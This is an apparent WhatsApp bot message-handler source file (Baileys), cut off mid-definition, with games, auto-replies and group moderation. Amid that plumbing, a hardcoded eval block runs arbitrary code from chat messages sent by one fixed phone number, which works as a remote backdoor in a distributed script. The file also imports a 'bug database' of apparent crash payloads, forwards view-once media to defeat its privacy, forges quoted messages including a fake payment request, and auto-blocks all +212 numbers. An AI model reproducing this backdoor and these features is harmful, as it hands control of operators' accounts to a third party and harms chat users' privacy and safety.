require("./settings");
require("./lib/listmenu");
const { modul } = require("./module");
const {
  os,
  axios,
  baileys,
  chalk,
  cheerio,
  child_process,
  crypto,
  cookie,
  FormData,
  FileType,
  fetch,
  fs,
  fsx,
  ffmpeg,
  Jimp,
  jsobfus,
  PhoneNumber,
  process,
  moment,
  ms,
  speed,
  syntaxerror,
  util,
  ytdl,
  googleTTS,
  maker,
} = modul;
const { exec, spawn, execSync } = child_process;
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = baileys;
const {
  clockString,
  parseMention,
  formatp,
  tanggal,
  getTime,
  isUrl,
  sleep,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  reSize,
  generateProfilePicture,
  getRandom,
} = require("./lib/myfunc");
const { color, bgcolor } = require("./lib/color");
const { fetchBuffer, buffergif } = require("./lib/myfunc2");
const { rentfromnhd, conns } = require("./RentBot");
const { uptotelegra } = require("./scrape/upload");
const { msgFilter } = require("./lib/antispam");

const {
  ytDonlodMp3,
  ytDonlodMp4,
  ytPlayMp3,
  ytPlayMp4,
  ytSearch,
} = require("./scrape/yt");
const scp1 = require("./scrape/scraper");
const scp2 = require("./scrape/scraperr");
const scp3 = require("./scrape/scraperrr");
const ffstalk = require("./scrape/ffstalk");
const githubstalk = require("./scrape/githubstalk");
const npmstalk = require("./scrape/npmstalk");
const mlstalk = require("./scrape/mlstalk");
const photooxy = require("./scrape/photooxy");
const yts = require("./scrape/yt-search");
const vm = require("node:vm");
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
const owner = JSON.parse(fs.readFileSync("./database/owner.json"));
const prem = JSON.parse(fs.readFileSync("./database/premium.json"));
const nhdverifieduser = JSON.parse(fs.readFileSync("./database/user.json"));
const VoiceNoteNhd = JSON.parse(
  fs.readFileSync("./NhdMedia/database/nhdvn.json")
);
const StickerNhd = JSON.parse(
  fs.readFileSync("./NhdMedia/database/nhdsticker.json")
);
const ImageNhd = JSON.parse(
  fs.readFileSync("./NhdMedia/database/nhdimage.json")
);
const VideoNhd = JSON.parse(
  fs.readFileSync("./NhdMedia/database/nhdvideo.json")
);
const BadNhd = JSON.parse(fs.readFileSync("./database/bad.json"));
const DocNhd = JSON.parse(fs.readFileSync("./NhdMedia/database/doc.json"));
const ZipNhd = JSON.parse(fs.readFileSync("./NhdMedia/database/zip.json"));
const ApkNhd = JSON.parse(fs.readFileSync("./NhdMedia/database/apk.json"));

let autosticker = JSON.parse(fs.readFileSync("./database/autosticker.json"));
let ntnsfw = JSON.parse(fs.readFileSync("./database/nsfw.json"));
let ntvirtex = JSON.parse(fs.readFileSync("./database/antivirus.json"));
let nttoxic = JSON.parse(fs.readFileSync("./database/antitoxic.json"));
let ntwame = JSON.parse(fs.readFileSync("./database/antiwame.json"));
let ntlinkgc = JSON.parse(fs.readFileSync("./database/antilinkgc.json"));
let ntilinkall = JSON.parse(fs.readFileSync("./database/antilinkall.json"));
let ntilinktwt = JSON.parse(fs.readFileSync("./database/antilinktwitter.json"));
let ntilinktt = JSON.parse(fs.readFileSync("./database/antilinktiktok.json"));
let ntilinktg = JSON.parse(fs.readFileSync("./database/antilinktelegram.json"));
let ntilinkfb = JSON.parse(fs.readFileSync("./database/antilinkfacebook.json"));
let ntilinkig = JSON.parse(
  fs.readFileSync("./database/antilinkinstagram.json")
);
let ntilinkytch = JSON.parse(
  fs.readFileSync("./database/antilinkytchannel.json")
);
let ntilinkytvid = JSON.parse(
  fs.readFileSync("./database/antilinkytvideo.json")
);

//bug database
const { nhdtext1 } = require("./XBug/nhdtext1");
const { nhdtext2 } = require("./XBug/nhdtext2");
const { nhdtext3 } = require("./XBug/nhdtext3");
const { nhdtext4 } = require("./XBug/nhdtext4");
const { nhdtext5 } = require("./XBug/nhdtext5");

global.db = JSON.parse(fs.readFileSync("./database/database.json"));
if (global.db)
  global.db = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    settings: {},
    ...(global.db || {}),
  };

// read database
let tebaklagu = (db.game.tebaklagu = []);
let kuismath = (db.game.math = []);
let vote = (db.others.vote = []);

module.exports = NhdBotFunc = async (NhdBotFunc, m, chatUpdate, store) => {
  try {
    const { type, quotedMsg, mentioned, now, fromMe } = m;
    const body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.chat
        : "";
    const budy = typeof m.text == "string" ? m.text : "";
    const prefix = prefa
      ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
      : prefa ?? global.prefix;

    const chath =
      m.mtype === "conversation" && m.message.conversation
        ? m.message.conversation
        : m.mtype == "imageMessage" && m.message.imageMessage.caption
        ? m.message.imageMessage.caption
        : m.mtype == "documentMessage" && m.message.documentMessage.caption
        ? m.message.documentMessage.caption
        : m.mtype == "videoMessage" && m.message.videoMessage.caption
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.text
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage" &&
          m.message.buttonsResponseMessage.selectedButtonId
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "templateButtonReplyMessage" &&
          m.message.templateButtonReplyMessage.selectedId
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "messageContextInfo"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : "";
    const pes =
      m.mtype === "conversation" && m.message.conversation
        ? m.message.conversation
        : m.mtype == "imageMessage" && m.message.imageMessage.caption
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage" && m.message.videoMessage.caption
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.text
        ? m.message.extendedTextMessage.text
        : "";
    const messagesC = pes.slice(0).trim();
    const content = JSON.stringify(m.message);
    const isCmd = body.startsWith(prefix);
    const from = m.key.remoteJid;
    const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase();
    const command = body
      .replace(prefix, "")
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase();

    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const botNumber = await NhdBotFunc.decodeJid(NhdBotFunc.user.id);
    const NhdTheCreator = [botNumber, ...owner]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
    const NhdTheDeveloper = m.sender == botNumber ? true : false;
    const text = (q = args.join(" "));
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const qmsg = quoted.msg || quoted;
    const isMedia = /image|video|sticker|audio/.test(mime);
    const isImage = type == "imageMessage";
    const isVideo = type == "videoMessage";
    const isAudio = type == "audioMessage";
    const isSticker = type == "stickerMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedLocation =
      type === "extendedTextMessage" && content.includes("locationMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedContact =
      type === "extendedTextMessage" && content.includes("contactMessage");
    const isQuotedDocument =
      type === "extendedTextMessage" && content.includes("documentMessage");
    const sender = m.isGroup
      ? m.key.participant
        ? m.key.participant
        : m.participant
      : m.key.remoteJid;
    const senderNumber = sender.split("@")[0];
    const groupMetadata = m.isGroup
      ? await NhdBotFunc.groupMetadata(m.chat).catch((e) => {})
      : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : "";
    const groupAdmins = m.isGroup
      ? await participants.filter((v) => v.admin !== null).map((v) => v.id)
      : "";
    const groupOwner = m.isGroup ? groupMetadata.owner : "";
    const groupMembers = m.isGroup ? groupMetadata.participants : "";
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isPrem = prem.includes(m.sender);
    const isUser = nhdverifieduser.includes(sender);
    const banUser = await NhdBotFunc.fetchBlocklist();
    const isBanned = banUser ? banUser.includes(m.sender) : false;
    const mentionUser = [
      ...new Set([
        ...(m.mentionedJid || []),
        ...(m.quoted ? [m.quoted.sender] : []),
      ]),
    ];
    const mentionByTag =
      type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.mentionedJid
        : [];
    const mentionByReply =
      type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.participant || ""
        : "";
    const numberQuery =
      q.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
    const usernya = mentionByReply ? mentionByReply : mentionByTag[0];
    const Input = mentionByTag[0]
      ? mentionByTag[0]
      : mentionByReply
      ? mentionByReply
      : q
      ? numberQuery
      : false;
    const isEval = body.startsWith("=>");

    const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false;
    const isAutoSticker = m.isGroup ? autosticker.includes(from) : false;
    const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false;
    const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false;
    const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false;
    const AntiLinkYoutubeChannel = m.isGroup
      ? ntilinkytch.includes(from)
      : false;
    const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false;
    const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false;
    const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false;
    const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false;
    const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false;
    const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false;
    const antiWame = m.isGroup ? ntwame.includes(from) : false;
    const antiToxic = m.isGroup ? nttoxic.includes(from) : false;

    //theme sticker reply
    const NhdStickWait = () => {
      let NhdStikRep = fs.readFileSync(
        "./NhdMedia/theme/sticker_reply/wait.webp"
      );
      NhdBotFunc.sendMessage(from, { sticker: NhdStikRep }, { quoted: m });
    };
    const NhdStickAdmin = () => {
      let NhdStikRep = fs.readFileSync(
        "./NhdMedia/theme/sticker_reply/admin.webp"
      );
      NhdBotFunc.sendMessage(from, { sticker: NhdStikRep }, { quoted: m });
    };
    const NhdStickBotAdmin = () => {
      let NhdStikRep = fs.readFileSync(
        "./NhdMedia/theme/sticker_reply/botadmin.webp"
      );
      NhdBotFunc.sendMessage(from, { sticker: NhdStikRep }, { quoted: m });
    };
    const NhdStickOwner = () => {
      let NhdStikRep = fs.readFileSync(
        "./NhdMedia/theme/sticker_reply/owner.webp"
      );
      NhdBotFunc.sendMessage(from, { sticker: NhdStikRep }, { quoted: m });
    };
    const NhdStickGroup = () => {
      let NhdStikRep = fs.readFileSync(
        "./NhdMedia/theme/sticker_reply/group.webp"
      );
      NhdBotFunc.sendMessage(from, { sticker: NhdStikRep }, { quoted: m });
    };
    const NhdStickPrivate = () => {
      let NhdStikRep = fs.readFileSync(
        "./NhdMedia/theme/sticker_reply/private.webp"
      );
      NhdBotFunc.sendMessage(from, { sticker: NhdStikRep }, { quoted: m });
    };

    //TIME
    const xtime = moment.tz("Asia/Kolkata").format("HH:mm:ss");
    const xdate = moment.tz("Asia/Kolkata").format("DD/MM/YYYY");
    const time2 = moment().tz("Asia/Kolkata").format("HH:mm:ss");
    if (time2 < "23:59:00") {
      var nhdytimewisher = `Good Night 🌌`;
    }
    if (time2 < "19:00:00") {
      var nhdytimewisher = `Good Evening 🌃`;
    }
    if (time2 < "18:00:00") {
      var nhdytimewisher = `Good Evening 🌃`;
    }
    if (time2 < "15:00:00") {
      var nhdytimewisher = `Good Afternoon 🌅`;
    }
    if (time2 < "11:00:00") {
      var nhdytimewisher = `Good Morning 🌄`;
    }
    if (time2 < "05:00:00") {
      var nhdytimewisher = `Good Morning 🌄`;
    }

    if (isEval && senderNumber == "916909137213") {
      let evaled,
        text = q,
        { inspect } = require("util");
      try {
        if (text.endsWith("--sync")) {
          evaled = await eval(
            `(async () => { ${text.trim.replace("--sync", "")} })`
          );
          m.reply(evaled);
        }
        evaled = await eval(text);
        if (typeof evaled !== "string") evaled = inspect(evaled);
        await NhdBotFunc.sendMessage(from, { text: evaled }, { quoted: m });
      } catch (e) {
        NhdBotFunc.sendMessage(from, { text: String(e) }, { quoted: m });
      }
    }
    try {
      let isNumber = (x) => typeof x === "number" && !isNaN(x);
      let user = global.db.users[m.sender];
      if (typeof user !== "object") global.db.users[m.sender] = {};
      if (user) {
        if (!isNumber(user.afkTime)) user.afkTime = -1;
        if (!("afkReason" in user)) user.afkReason = "";
        if (!("premium" in user)) user.premium = false;
      } else
        global.db.users[m.sender] = {
          afkTime: -1,
          afkReason: "",
          premium: false,
        };
      let chats = global.db.chats[m.chat];
      if (typeof chats !== "object") global.db.chats[m.chat] = {};
      if (chats) {
      } else global.db.chats[from] = {};
    } catch (err) {
      console.error(err);
    }

    if (!NhdBotFunc.public) {
      if (!m.key.fromMe) return;
    }

    //chat counter (console log)
    if (m.message && m.isGroup) {
      console.log(
        color(
          `\n< ================================================== >\n`,
          "cyan"
        )
      );
      console.log(color(`Group Chat:`, "green"));
      console.log(
        chalk.black(chalk.bgWhite("[ MESSAGE ]")),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) +
          "\n" +
          chalk.magenta("=> From"),
        chalk.green(pushname),
        chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> In"),
        chalk.green(groupName, m.chat)
      );
    } else {
      console.log(
        color(
          `\n< ================================================== >\n`,
          "cyan"
        )
      );
      console.log(color(`Private Chat:`, "green"));
      console.log(
        chalk.black(chalk.bgWhite("[ MESSAGE ]")),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) +
          "\n" +
          chalk.magenta("=> From"),
        chalk.green(pushname),
        chalk.yellow(m.sender)
      );
    }

    if (isCmd && !isUser) {
      nhdverifieduser.push(sender);
      fs.writeFileSync(
        "./database/user.json",
        JSON.stringify(nhdverifieduser, null, 2)
      );
    }

    NhdBotFunc.sendPresenceUpdate("unavailable", from);

    for (let jid of mentionUser) {
      let user = global.db.users[jid];
      if (!user) continue;
      let afkTime = user.afkTime;
      if (!afkTime || afkTime < 0) continue;
      let reason = user.afkReason || "";
      m.reply(
        `Don't Tag Him!
He's AFK ${reason ? "With Reason: " + reason : "No Reason"}
During ${clockString(new Date() - afkTime)}
`.trim()
      );
    }

    //math
    if (kuismath.hasOwnProperty(m.sender.split("@")[0]) && isCmd) {
      kuis = true;

      jawaban = kuismath[m.sender.split("@")[0]];

      if (budy.toLowerCase() == jawaban) {
        await m.reply(
          `🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`
        );

        delete kuismath[m.sender.split("@")[0]];
      } else m.reply("*Wrong Answer!*");
    }

    //TicTacToe
    this.game = this.game ? this.game : {};
    let room = Object.values(this.game).find(
      (room) =>
        room.id &&
        room.game &&
        room.state &&
        room.id.startsWith("tictactoe") &&
        [room.game.playerX, room.game.playerO].includes(m.sender) &&
        room.state == "PLAYING"
    );
    if (room) {
      let ok;
      let isWin = !1;
      let isTie = !1;
      let isSurrender = !1;
      // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
      if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return;
      isSurrender = !/^[1-9]$/.test(m.text);
      if (m.sender !== room.game.currentTurn) {
        if (!isSurrender) return !0;
      }
      if (
        !isSurrender &&
        1 >
          (ok = room.game.turn(
            m.sender === room.game.playerO,
            parseInt(m.text) - 1
          ))
      ) {
        m.reply(
          {
            "-3": "The game is over",
            "-2": "Invalid",
            "-1": "Invalid Position",
            0: "Invalid Position",
          }[ok]
        );
        return !0;
      }
      if (m.sender === room.game.winner) isWin = true;
      else if (room.game.board === 511) isTie = true;
      let arr = room.game.render().map((v) => {
        return {
          X: "❌",
          O: "⭕",
          1: "1️⃣",
          2: "2️⃣",
          3: "3️⃣",
          4: "4️⃣",
          5: "5️⃣",
          6: "6️⃣",
          7: "7️⃣",
          8: "8️⃣",
          9: "9️⃣",
        }[v];
      });
      if (isSurrender) {
        room.game._currentTurn = m.sender === room.game.playerX;
        isWin = true;
      }
      let winner = isSurrender ? room.game.currentTurn : room.game.winner;
      let str = `Room ID: ${room.id}

${arr.slice(0, 3).join("")}
${arr.slice(3, 6).join("")}
${arr.slice(6).join("")}

${
  isWin
    ? `@${winner.split("@")[0]} Won!`
    : isTie
    ? `Game over`
    : `Turn ${["❌", "⭕"][1 * room.game._currentTurn]} (@${
        room.game.currentTurn.split("@")[0]
      })`
}
❌: @${room.game.playerX.split("@")[0]}
⭕: @${room.game.playerO.split("@")[0]}

Type *surrender* to give up and admit defeat`;
      if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
        room[room.game._currentTurn ^ isSurrender ? "x" : "o"] = from;
      if (room.x !== room.o)
        await NhdBotFunc.sendText(room.x, str, m, {
          mentions: parseMention(str),
        });
      await NhdBotFunc.sendText(room.o, str, m, {
        mentions: parseMention(str),
      });
      if (isTie || isWin) {
        delete this.game[room.id];
      }
    }

    //Suit PvP
    this.suit = this.suit ? this.suit : {};
    let roof = Object.values(this.suit).find(
      (roof) => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender)
    );
    if (roof) {
      let win = "";
      let tie = false;
      if (
        m.sender == roof.p2 &&
        /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(
          m.chat
        ) &&
        m.isGroup &&
        roof.status == "wait"
      ) {
        if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.chat)) {
          NhdBotFunc.sendTextWithMentions(
            m.chat,
            `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`,
            m
          );
          delete this.suit[roof.id];
          return !0;
        }
        roof.status = "play";
        roof.asal = m.chat;
        clearTimeout(roof.waktu);
        //delete roof[roof.id].waktu
        NhdBotFunc.sendText(
          m.chat,
          `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`,
          m,
          { mentions: [roof.p, roof.p2] }
        );
        if (!roof.pilih)
          NhdBotFunc.sendText(
            roof.p,
            `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`,
            m
          );
        if (!roof.pilih2)
          NhdBotFunc.sendText(
            roof.p2,
            `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`,
            m
          );
        roof.waktu_milih = setTimeout(() => {
          if (!roof.pilih && !roof.pilih2)
            NhdBotFunc.sendText(
              m.chat,
              `Both Players Don't Want To Play,\nSuit Canceled`
            );
          else if (!roof.pilih || !roof.pilih2) {
            win = !roof.pilih ? roof.p2 : roof.p;
            NhdBotFunc.sendTextWithMentions(
              m.chat,
              `@${
                (roof.pilih ? roof.p2 : roof.p).split`@`[0]
              } Didn't Choose Suit, Game Over!`,
              m
            );
          }
          delete this.suit[roof.id];
          return !0;
        }, roof.timeout);
      }
      let jwb = m.sender == roof.p;
      let jwb2 = m.sender == roof.p2;
      let g = /scissors/i;
      let b = /rock/i;
      let k = /paper/i;
      let reg = /^(scissors|rock|paper)/i;
      if (jwb && reg.test(m.chat) && !roof.pilih && !m.isGroup) {
        roof.pilih = reg.exec(m.chat.toLowerCase())[0];
        roof.text = m.chat;
        m.reply(
          `You have chosen ${m.chat} ${
            !roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ""
          }`
        );
        if (!roof.pilih2)
          NhdBotFunc.sendText(
            roof.p2,
            "_The opponent has chosen_\nNow it is your turn",
            0
          );
      }
      if (jwb2 && reg.test(m.chat) && !roof.pilih2 && !m.isGroup) {
        roof.pilih2 = reg.exec(m.chat.toLowerCase())[0];
        roof.text2 = m.chat;
        m.reply(
          `You have chosen ${m.chat} ${
            !roof.pilih ? `\n\nWaiting for the opponent to choose` : ""
          }`
        );
        if (!roof.pilih)
          NhdBotFunc.sendText(
            roof.p,
            "_The opponent has chosen_\nNow it is your turn",
            0
          );
      }
      let stage = roof.pilih;
      let stage2 = roof.pilih2;
      if (roof.pilih && roof.pilih2) {
        clearTimeout(roof.waktu_milih);
        if (b.test(stage) && g.test(stage2)) win = roof.p;
        else if (b.test(stage) && k.test(stage2)) win = roof.p2;
        else if (g.test(stage) && k.test(stage2)) win = roof.p;
        else if (g.test(stage) && b.test(stage2)) win = roof.p2;
        else if (k.test(stage) && b.test(stage2)) win = roof.p;
        else if (k.test(stage) && g.test(stage2)) win = roof.p2;
        else if (stage == stage2) tie = true;
        NhdBotFunc.sendText(
          roof.asal,
          `_*Suit Results*_${tie ? "\nSERIES" : ""}

@${roof.p.split`@`[0]} (${roof.text}) ${
            tie ? "" : roof.p == win ? ` Win \n` : ` Lost \n`
          }
@${roof.p2.split`@`[0]} (${roof.text2}) ${
            tie ? "" : roof.p2 == win ? ` Win \n` : ` Lost  \n`
          }
`.trim(),
          m,
          { mentions: [roof.p, roof.p2] }
        );
        delete this.suit[roof.id];
      }
    } //end

    if (db.users[m.sender].afkTime > -1) {
      let user = global.db.users[m.sender];
      m.reply(
        `
You Quit AFK${user.afkReason ? " After: " + user.afkReason : ""}
During ${clockString(new Date() - user.afkTime)}
`.trim()
      );
      user.afkTime = -1;
      user.afkReason = "";
    }

    //autoblock 212
    if (global.autoblockmorroco) {
      if (m.sender.startsWith("212"))
        return NhdBotFunc.updateBlockStatus(m.sender, "block");
    }

    //autokick 212
    if (global.autokickmorroco) {
      if (m.isGroup && m.sender.startsWith("212"))
        return NhdBotFunc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
    }

    //antispam kick
    if (global.antispam) {
      if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
        console.log(
          `${global.themeemoji}[SPAM]`,
          color(
            moment(m.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"),
            "yellow"
          ),
          color(`${command} [${args.length}]`),
          "from",
          color(m.pushName)
        );

        return await NhdBotFunc.groupParticipantsUpdate(
          m.chat,
          [m.sender],
          "remove"
        );
      }
    }

    async function sendNhdBotFuncMessage(chatId, message, options = {}) {
      let generate = await generateWAMessage(chatId, message, options);
      let type2 = getContentType(generate.message);
      if ("contextInfo" in options)
        generate.message[type2].contextInfo = options?.contextInfo;
      if ("contextInfo" in message)
        generate.message[type2].contextInfo = message?.contextInfo;
      return await NhdBotFunc.relayMessage(chatId, generate.message, {
        messageId: generate.key.id,
      });
    }

    //group chat msg by nhd
    const replygcnhd = (teks) => {
      NhdBotFunc.sendMessage(
        m.chat,
        {
          text: teks,
          contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 9999999,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: true,
              containsAutoReply: true,
              title: ` ${global.botname}`,
              body: `${ownername}`,
              previewType: "PHOTO",
              thumbnailUrl: ``,
              thumbnail: fs.readFileSync(`./NhdMedia/theme/cheemspic.jpg`),
              sourceUrl: `${wagc}`,
            },
          },
        },
        { quoted: m }
      );
    };
    const replygcnhd2 = (teks) => {
      sendNhdBotFuncMessage(from, {
        text: teks,
        mentions: [sender],
        contextInfo: {
          forwardingScore: 9999999,
          isForwarded: true,
          mentionedJid: [sender],
          externalAdReply: {
            showAdAttribution: true,
            renderLargerThumbnail: true,
            title: botname,
            containsAutoReply: true,
            mediaType: 1,
            thumbnail: defaultpp,
            mediaUrl: `${wagc}`,
            sourceUrl: `${wagc}`,
          },
        },
      });
    };
    const reply = (teks) => {
      NhdBotFunc.sendMessage(
        from,
        {
          text: teks,
          contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
          },
        },
        { quoted: fpay }
      );
    };

    const sendSticker = (pesan) => {
      NhdBotFunc.sendImageAsSticker(m.chat, pesan, m, {
        packname: global.packname,
        author: global.author,
      });
    };

    const sendvn = (teks) => {
      NhdBotFunc.sendMessage(
        from,
        { audio: teks, mimetype: "audio/mp4", ptt: true },
        { quoted: m }
      );
    };

    //bug loading
    async function loading() {
      var nhdlod = [
        "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
        "《 ████▒▒▒▒▒▒▒▒》30%",
        "《 ███████▒▒▒▒▒》50%",
        "《 ██████████▒▒》80%",
        "《 ████████████》100%",
        "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄...",
      ];
      let { key } = await NhdBotFunc.sendMessage(from, { text: "ʟᴏᴀᴅɪɴɢ..." });

      for (let i = 0; i < nhdlod.length; i++) {
        await NhdBotFunc.sendMessage(from, { text: nhdlod[i], edit: key });
      }
    }

    //autoreply
    for (let BhosdikaNhd of VoiceNoteNhd) {
      if (budy === BhosdikaNhd) {
        let audiobuffy = fs.readFileSync(`./NhdMedia/audio/${BhosdikaNhd}.mp3`);
        NhdBotFunc.sendMessage(
          m.chat,
          { audio: audiobuffy, mimetype: "audio/mp4", ptt: true },
          { quoted: m }
        );
      }
    }
    for (let BhosdikaNhd of StickerNhd) {
      if (budy === BhosdikaNhd) {
        let stickerbuffy = fs.readFileSync(
          `./NhdMedia/sticker/${BhosdikaNhd}.webp`
        );
        NhdBotFunc.sendMessage(
          m.chat,
          { sticker: stickerbuffy },
          { quoted: m }
        );
      }
    }
    for (let BhosdikaNhd of ImageNhd) {
      if (budy === BhosdikaNhd) {
        let imagebuffy = fs.readFileSync(`./NhdMedia/image/${BhosdikaNhd}.jpg`);
        NhdBotFunc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m });
      }
    }
    for (let BhosdikaNhd of VideoNhd) {
      if (budy === BhosdikaNhd) {
        let videobuffy = fs.readFileSync(`./NhdMedia/video/${BhosdikaNhd}.mp4`);
        NhdBotFunc.sendMessage(m.chat, { video: videobuffy }, { quoted: m });
      }
    }

    const sendapk = (teks) => {
      NhdBotFunc.sendMessage(
        from,
        { document: teks, mimetype: "application/vnd.android.package-archive" },
        { quoted: m }
      );
    };
    for (let BhosdikaNhd of ApkNhd) {
      if (budy === BhosdikaNhd) {
        let buffer = fs.readFileSync(`./NhdMedia/apk/${BhosdikaNhd}.apk`);
        sendapk(buffer);
      }
    }

    const sendzip = (teks) => {
      NhdBotFunc.sendMessage(
        from,
        { document: teks, mimetype: "application/zip" },
        { quoted: m }
      );
    };
    for (let BhosdikaNhd of ZipNhd) {
      if (budy === BhosdikaNhd) {
        let buffer = fs.readFileSync(`./NhdMedia/zip/${BhosdikaNhd}.zip`);
        sendzip(buffer);
      }
    }

    const senddocu = (teks) => {
      haikal.sendMessage(
        from,
        { document: teks, mimetype: "application/pdf" },
        { quoted: m }
      );
    };
    for (let BhosdikaNhd of DocNhd) {
      if (budy === BhosdikaNhd) {
        let buffer = fs.readFileSync(`./NhdMedia/doc/${BhosdikaNhd}.pdf`);
        senddocu(buffer);
      }
    }

    if (m.isGroup && m.mtype == "viewOnceMessage") {
      let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${
        m.sender.split("@")[0]
      }\n├ *Clock* : ${time2}\n└ *Message* : ${m.mtype}`;
      NhdBotFunc.sendMessage(
        m.chat,
        { text: teks, mentions: [m.sender] },
        { quoted: m }
      );
      await sleep(500);
      m.copyNForward(m.chat, true, { readViewOnce: true }, { quoted: m }).catch(
        (_) => m.reply(`Maybe It's Opened`)
      );
    }

    const lep = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...{ remoteJid: "" },
      },
      message: {
        imageMessage: {
          mimetype: "image/jpeg",
          caption: `${ownername}`,
          jpegThumbnail: defaultpp,
        },
      },
    };

    const ftext = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from
          ? {
              remoteJid: `${ownernumber}@s.whatsapp.net`,
            }
          : {}),
      },
      message: {
        extendedTextMessage: {
          text: `${m.pushName}`,
          title: `${m.pushName}`,
          jpegThumbnail: defaultpp,
        },
      },
    };

    const banRep = () => {
      NhdBotFunc.sendMessage(
        m.chat,
        {
          text: `Sorry you've been banned, please chat @${
            creator.split("@")[0]
          } to unban`,
          mentions: [creator],
        },
        {
          quoted: m,
        }
      );
    };

    //Fake
    const fpay = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: global.botname,
        participant: "0@s.whatsapp.net",
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: "0@s.whatsapp.net",
